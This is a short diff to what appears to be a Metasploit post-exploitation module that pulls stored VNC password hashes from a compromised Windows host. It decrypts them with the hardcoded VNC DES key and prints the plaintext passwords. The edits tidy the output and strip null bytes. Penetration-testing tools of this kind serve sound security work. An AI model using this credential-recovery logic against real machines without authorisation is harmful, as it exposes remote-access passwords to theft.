@@ -41,7 +41,7 @@ class Metasploit3 < Msf::Post
     # 5A B2 CD C0 BA DC AF 13
     fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
     pass = Rex::Proto::RFB::Cipher.decrypt ["#{hash}"].pack('H*'), fixedkey
-    return pass
+    pass.gsub(/\0/, '')
   end
 
   # Pull encrypted passwords from file based storage
@@ -200,7 +200,7 @@ class Metasploit3 < Msf::Post
     print_status("Enumerating VNC passwords on #{sysinfo['Computer']}")
 
     locations.map { |e|
-      print_status("Checking #{e[:name]}...")
+      vprint_status("Checking #{e[:name]}...")
       if e.has_key?(:check_reg)
         e[:port] = reg_get(e[:check_reg],e[:port_variable])
         e[:hash] = reg_get(e[:check_reg],e[:pass_variable])
@@ -223,7 +223,7 @@ class Metasploit3 < Msf::Post
         if e[:port] == nil
           e[:port] = 5900
         end
-        print_good("#{e[:name]} => #{e[:hash]} => #{e[:pass]} on port: #{e[:port]}")
+        print_good("Location: #{e[:name]} => Hash: #{e[:hash]} => Password: #{e[:pass]} => Port: #{e[:port]}")
 
         service_data = {
             address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
